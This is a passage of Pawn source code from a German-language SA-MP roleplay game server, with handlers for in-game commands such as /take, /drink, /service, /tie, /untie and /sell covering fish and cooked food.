							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
					        format(string, sizeof(string), "* Du hast %s's die Boat License abgenommen.", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Admin %s hat dir deine Boat's License abgenommen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pBoatLic] = 0;
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"weapons",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take weapons [playerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
					        format(string, sizeof(string), "* Du hast %s's die Waffen abgenommen.", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Admin %s hat dir deine Waffen abgenommen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        ResetPlayerWeapons(giveplayerid);
					        PlayerInfo[giveplayerid][pGun1] = 0; PlayerInfo[giveplayerid][pAmmo1] = 0;
					        PlayerInfo[giveplayerid][pGun2] = 0; PlayerInfo[giveplayerid][pAmmo2] = 0;
					        PlayerInfo[giveplayerid][pGun3] = 0; PlayerInfo[giveplayerid][pAmmo3] = 0;
					        PlayerInfo[giveplayerid][pGun4] = 0; PlayerInfo[giveplayerid][pAmmo4] = 0;
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"drugs",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /take drugs [playerid/PartOfName]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
						    format(string, sizeof(string), "* Du hast %s's Drogen abgenommen.", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Admin %s hat dir deine Drogen abgenommen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pDrugs] = 0;
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"materials",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take materials [playerid/PartOfName]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
						    format(string, sizeof(string), "* Du hast %s's Materialien abgenommen .", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Admin %s hat dir deine Materialien abgenommen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pMats] = 0;
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "   Ungenauer Name !");
					return 1;
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein COP !");
	            return 1;
	        }
	    }
	    return 1;
	}
    if(strcmp(cmd, "/drink", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAtBar(playerid))
            {
                if(PlayerDrunk[playerid] < 10)
                {
                    ShowPlayerDialog(playerid, DIALOG_DRINK,DIALOG_STYLE_LIST, "Getränke Liste","Mineralwasser 1€\nCoca Cola 2€\nRed Bull 6€\nACE-Saft 1€\nEistee 2€\nBecks 3€\nMixery 3€\nRadeberger 3€\nPilsener Urquell 3€\nKölsch 3€\nRotkäppchen 4€\nAsti Cinzano 5€\nRiesling 4€\nHenkel Trocken 3€\nSchönlein 4€\nOuzo 5€\nStroh 80 10€\nPuschkin Wodka 5€\nAbsinth 10€\nRaki 8€", "Auswählen", "Abbrechen");
				}
                else
                {
                    SCM(playerid, COLOR_GREY, "   Du kannst nichts mehr Trinken !");
                    return 1;
                }
            }
            else
            {
                SCM(playerid, COLOR_GREY, "   Du bist nicht an einer Bar !");
                return 1;
            }
        }
        return 1;
    }
	if(strcmp(cmd, "/service", true) == 0)
	{
/*
 		if(JustService[playerid] == 1)
   		{
     		SendClientMessage(playerid,COLOR_GREY," * Du hast gerade einen Service angefordert, warte ein wenig.");
       		return 1;
	    }
*/
	    ShowPlayerDialog(playerid,DIALOG_SERVICE,DIALOG_STYLE_LIST,"Service von SanAndreas","Taxi\nBus\nSanitäter\nWheelmen\nOrdnungsamt\nPolizei\nFeuerwehr\nMechaniker","Rufen","Abbrechen");
	    return 1;
	}
	if(strcmp(cmd, "/tie", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(IsAGang(playerid) || PlayerInfo[playerid][pFMember] < 255)
			{
			    if(PlayerInfo[playerid][pRank] < 3)
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Du brauchst Rang 3 oder höher !");
			        return 1;
			    }
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "Benutze: /tie [Playerid]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(PlayerInfo[giveplayerid][pLevel] <= 2)
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst keine Level 1er / Level 2er einsperren!");
				    return 1;
				}
			    if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
					    if(PlayerTied[giveplayerid] > 0)
					    {
					        SendClientMessage(playerid, COLOR_GREY, "   Schon gefesselt !");
					        return 1;
					    }
						if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    new car = GetPlayerVehicleID(playerid);
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selber Anbinden!"); return 1; }
						    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(giveplayerid, car))
						    {
						        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        format(string, sizeof(string), "* Du wurdest von %s gefesselt.", sendername);
								SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* Du hast %s gefesselt.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* %s hat %s gefesselt.", sendername ,giveplayer);
								ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								GameTextForPlayer(giveplayerid, "~r~Gefesselt", 2500, 3);
								FreezePlayer(giveplayerid);
								PlayerTied[giveplayerid] = 1;
						    }
						    else
						    {
						        SendClientMessage(playerid, COLOR_GREY, "   Spieler ist nicht in deinem Fahrzeug!");
						        return 1;
						    }
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
						    return 1;
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Du bist in keiner Familie, Member / Leader !");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/untie", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(IsAGang(playerid) || IsACop(playerid) || PlayerInfo[playerid][pFMember] < 255 || PlayerInfo[playerid][pAdmin] >= 1)
			{
			    if(PlayerInfo[playerid][pRank] < 1)
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Du benötigst Rang 1 oder höher  !");
			        return 1;
			    }
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "Benutz: /untie [Playerid]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
					    if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selbst entfesseln!"); return 1; }
							if(PlayerTied[giveplayerid])
							{
							    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* Du wurdest von %s befreit.", sendername);
								SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* Du hast %s befreit.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(giveplayerid, "~g~Du bist frei", 2500, 3);
								UnFreezePlayer(giveplayerid);
								PlayerTied[giveplayerid] = 0;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist nicht gefesselt !");
							    return 1;
							}
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe !");
						    return 1;
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Gang-/Familienmitlgied oder Cop !");
			}
		}//not connected
		return 1;
	}
	if(strcmp(cmd, "/sell", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new x_nr[256];
			x_nr = strtoknew(cmdtext, idx);
			if(!strlen(x_nr)) {
				SendClientMessage(playerid, COLOR_WHITE, "|__________________ Verkaufen __________________|");
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /sell [name]");
		  		SendClientMessage(playerid, COLOR_GREY, "Verfügbare namen: Fish, Cooked");
				SendClientMessage(playerid, COLOR_WHITE, "|_____________________________________________|");
				return 1;
			}
		    if(strcmp(x_nr,"fish",true) == 0)
			{
			    if (!IsPlayerInRangeOfPoint(playerid,100.0,-30.875, -88.9609, 1004.53))//centerpoint 24-7
				{
					SendClientMessage(playerid, COLOR_GRAD2, " Du bist nicht im 24-7 !");
					return 1;
				}
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "Benutze: /sell fish [fish]");
					return 1;
				}
				new price;
				new fishid = strval(tmp);
				if(fishid < 1 || fishid > 5) { SendClientMessage(playerid, COLOR_GREY, "   Fischnummer muss zwischen 1 und 5 sein !"); return 1; }
				else if(fishid == 1 && Fishes[playerid][pWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Mit dieser Nummer hast du keinen Fish gefangen(1) !"); return 1; }
				else if(fishid == 2 && Fishes[playerid][pWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Mit dieser Nummer hast du keinen Fish gefangen(2) !"); return 1; }
				else if(fishid == 3 && Fishes[playerid][pWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Mit dieser Nummer hast du keinen Fish gefangen(3) !"); return 1; }
				else if(fishid == 4 && Fishes[playerid][pWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Mit dieser Nummer hast du keinen Fish gefangen(4) !"); return 1; }
				else if(fishid == 5 && Fishes[playerid][pWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Mit dieser Nummer hast du keinen Fish gefangen(5) !"); return 1; }
				ConsumingMoney[playerid] = 1;
				switch (fishid)
				{
				    case 1:
				    {
				        if(Fishes[playerid][pWeight1] < 20)
				        {
				            SendClientMessage(playerid, COLOR_WHITE, "Wir sind nur an Fischen interessiert die 20 LBS oder mehr wiegen.");
				            return 1;
				        }
                        price = FishCost(playerid, Fishes[playerid][pFid1]);
                        price = price * Fishes[playerid][pWeight1];
                        if(PlayerInfo[playerid][pTraderPerk] > 0)
				        {
				            new skill = price / 100;
				            new payout = (skill)*(5);
				            price += payout;
				        }
                        GameTextForPlayer(playerid, "~g~Fisch~n~~r~verkauft", 3000, 1);
                        format(string, sizeof(string), "* Du hast deinen %s Verkauf, Er wog %d LBS, Preis $%d.", Fishes[playerid][pFish1],Fishes[playerid][pWeight1],price);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						GivePlayerMoneySave(playerid, price);
						ClearFishID(playerid, 1);
				    }
				    case 2:
				    {
				        if(Fishes[playerid][pWeight2] < 20)
				        {
				            SendClientMessage(playerid, COLOR_WHITE, "Wir interessieren uns nur für Fische die mehr als 20 LBS wiegen.");
				            return 1;
				        }
            			price = FishCost(playerid, Fishes[playerid][pFid2]);
                        price = price * Fishes[playerid][pWeight2];
                        if(PlayerInfo[playerid][pTraderPerk] > 0)
				        {
				            new skill = price / 100;
				            new payout = (skill)*(5);
				            price += payout;
				        }
                        GameTextForPlayer(playerid, "~g~Fish~n~~r~verkauft", 3000, 1);
                        format(string, sizeof(string), "* Du hast deinen %s Verkauf, Er wog %d LBS, Preis $%d.", Fishes[playerid][pFish2],Fishes[playerid][pWeight2],price);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						GivePlayerMoneySave(playerid, price);
						ClearFishID(playerid, 2);
				    }
				    case 3:
				    {
				        if(Fishes[playerid][pWeight3] < 20)
				        {
				            SendClientMessage(playerid, COLOR_WHITE, "Wir sind nur an Fischen interessiert die 20 LBS oder mehr Wiegen.");
				            return 1;
				        }
            			price = FishCost(playerid, Fishes[playerid][pFid3]);
                        price = price * Fishes[playerid][pWeight3];
                        if(PlayerInfo[playerid][pTraderPerk] > 0)
				        {
				            new skill = price / 100;
				            new payout = (skill)*(5);
				            price += payout;
				        }
                        GameTextForPlayer(playerid, "~g~Fisch~n~~r~verkauft", 3000, 1);
                        format(string, sizeof(string), "* Du hast deinen %s Verkauft, Er wog %d LBS, Preis $%d.", Fishes[playerid][pFish3],Fishes[playerid][pWeight3],price);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						GivePlayerMoneySave(playerid, price);
						ClearFishID(playerid, 3);
				    }
				    case 4:
				    {
				        if(Fishes[playerid][pWeight4] < 20)
				        {
				            SendClientMessage(playerid, COLOR_WHITE, "Wir sind nur an Fischen interessiert die 20 LBS oder mehr Wiegen.");
				            return 1;
				        }
            			price = FishCost(playerid, Fishes[playerid][pFid4]);
                        price = price * Fishes[playerid][pWeight4];
                        if(PlayerInfo[playerid][pTraderPerk] > 0)
				        {
				            new skill = price / 100;
				            new payout = (skill)*(5);
				            price += payout;
				        }
                        GameTextForPlayer(playerid, "~g~Ficsh~n~~r~verkauft", 3000, 1);
                        format(string, sizeof(string), "* Du hast deinen %s Verkauft, Er wog %d LBS, Preis $%d.", Fishes[playerid][pFish4],Fishes[playerid][pWeight4],price);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						GivePlayerMoneySave(playerid, price);
						ClearFishID(playerid, 4);
				    }
				    case 5:
				    {
				        if(Fishes[playerid][pWeight5] < 20)
				        {
				            SendClientMessage(playerid, COLOR_WHITE, "Wir sind nur an Fischen interessiert die 20 LBS oder mehr Wiegen.");
				            return 1;
				        }
            			price = FishCost(playerid, Fishes[playerid][pFid5]);
                        price = price * Fishes[playerid][pWeight5];
                        if(PlayerInfo[playerid][pTraderPerk] > 0)
				        {
				            new skill = price / 100;
				            new payout = (skill)*(5);
				            price += payout;
				        }
                        GameTextForPlayer(playerid, "~g~Fisch~n~~r~verkauft", 3000, 1);
                        format(string, sizeof(string), "* Du hast deinen %s Verkauft, Er wog %d LBS, Preis $%d.", Fishes[playerid][pFish5],Fishes[playerid][pWeight5],price);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						GivePlayerMoneySave(playerid, price);
						ClearFishID(playerid, 5);
				    }
				}
				Fishes[playerid][pLastFish] = 0;
				Fishes[playerid][pFishID] = 0;
				return 1;
			}
			else if(strcmp(x_nr,"cooked",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "Benutze: /sell cooked [cooknummer] [playerid]");
					return 1;
				}
				new cookid = strval(tmp);
				if(cookid < 1 || cookid > 5) { SendClientMessage(playerid, COLOR_GREY, "   Die Kochnummer darf nicht unter 1 oder über 5 liegen !"); return 1; }
				else if(cookid == 1 && Cooking[playerid][pCWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast nichts Mit dieser Nummer gekocht(1) !"); return 1; }
				else if(cookid == 2 && Cooking[playerid][pCWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast nichts Mit dieser Nummer gekocht(2) !"); return 1; }
				else if(cookid == 3 && Cooking[playerid][pCWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast nichts Mit dieser Nummer gekocht(3) !"); return 1; }
				else if(cookid == 4 && Cooking[playerid][pCWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast nichts Mit dieser Nummer gekocht(4) !"); return 1; }
				else if(cookid == 5 && Cooking[playerid][pCWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast nichts Mit dieser Nummer gekocht(5) !"); return 1; }
				tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "Benutze: /sell cooked [cooknummer] [playerid]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
				        switch(cookid)
				        {
							case 1:
							{
							    if(Cooking[giveplayerid][pCWeight1] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook1]);
								    strmid(Cooking[giveplayerid][pCook1], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight1] = Cooking[playerid][pCWeight1];
								    Cooking[giveplayerid][pCookID1] = Cooking[playerid][pCookID1];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook1],Cooking[giveplayerid][pCWeight1]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight2] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook1]);
								    strmid(Cooking[giveplayerid][pCook2], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight2] = Cooking[playerid][pCWeight1];
								    Cooking[giveplayerid][pCookID2] = Cooking[playerid][pCookID1];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook2],Cooking[giveplayerid][pCWeight2]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight3] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook1]);
								    strmid(Cooking[giveplayerid][pCook3], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight3] = Cooking[playerid][pCWeight1];
								    Cooking[giveplayerid][pCookID3] = Cooking[playerid][pCookID1];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook3],Cooking[giveplayerid][pCWeight3]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight4] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook1]);
								    strmid(Cooking[giveplayerid][pCook4], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight4] = Cooking[playerid][pCWeight1];
								    Cooking[giveplayerid][pCookID4] = Cooking[playerid][pCookID1];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook4],Cooking[giveplayerid][pCWeight4]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight5] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook1]);
								    strmid(Cooking[giveplayerid][pCook5], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight5] = Cooking[playerid][pCWeight1];
								    Cooking[giveplayerid][pCookID5] = Cooking[playerid][pCookID1];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook5],Cooking[giveplayerid][pCWeight5]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else
							    {
							        SendClientMessage(playerid, COLOR_GREY, "   Der Spieler hat keinen Platz in seinem Kochbehälter !");
							        return 1;
							    }
							}
							case 2:
							{
							    if(Cooking[giveplayerid][pCWeight1] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook2]);
								    strmid(Cooking[giveplayerid][pCook1], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight1] = Cooking[playerid][pCWeight2];
								    Cooking[giveplayerid][pCookID1] = Cooking[playerid][pCookID2];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook1],Cooking[giveplayerid][pCWeight1]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight2] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook2]);
								    strmid(Cooking[giveplayerid][pCook2], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight2] = Cooking[playerid][pCWeight2];
								    Cooking[giveplayerid][pCookID2] = Cooking[playerid][pCookID2];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook2],Cooking[giveplayerid][pCWeight2]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight3] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook2]);
								    strmid(Cooking[giveplayerid][pCook3], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight3] = Cooking[playerid][pCWeight2];
								    Cooking[giveplayerid][pCookID3] = Cooking[playerid][pCookID2];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook3],Cooking[giveplayerid][pCWeight3]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight4] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook2]);
								    strmid(Cooking[giveplayerid][pCook4], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight4] = Cooking[playerid][pCWeight2];
								    Cooking[giveplayerid][pCookID4] = Cooking[playerid][pCookID2];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook4],Cooking[giveplayerid][pCWeight4]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight5] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook2]);
								    strmid(Cooking[giveplayerid][pCook5], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight5] = Cooking[playerid][pCWeight2];
								    Cooking[giveplayerid][pCookID5] = Cooking[playerid][pCookID2];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook5],Cooking[giveplayerid][pCWeight5]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else
							    {
							        SendClientMessage(playerid, COLOR_GREY, "   Der Spieler hat keinen Platz in seinem Kochbehälter !");
							        return 1;
							    }
							}
							case 3:
							{
							    if(Cooking[giveplayerid][pCWeight1] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook3]);
								    strmid(Cooking[giveplayerid][pCook1], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight1] = Cooking[playerid][pCWeight3];
								    Cooking[giveplayerid][pCookID1] = Cooking[playerid][pCookID3];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook1],Cooking[giveplayerid][pCWeight1]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight2] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook3]);
								    strmid(Cooking[giveplayerid][pCook2], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight2] = Cooking[playerid][pCWeight3];
								    Cooking[giveplayerid][pCookID2] = Cooking[playerid][pCookID3];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook2],Cooking[giveplayerid][pCWeight2]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight3] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook3]);
								    strmid(Cooking[giveplayerid][pCook3], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight3] = Cooking[playerid][pCWeight3];
								    Cooking[giveplayerid][pCookID3] = Cooking[playerid][pCookID3];
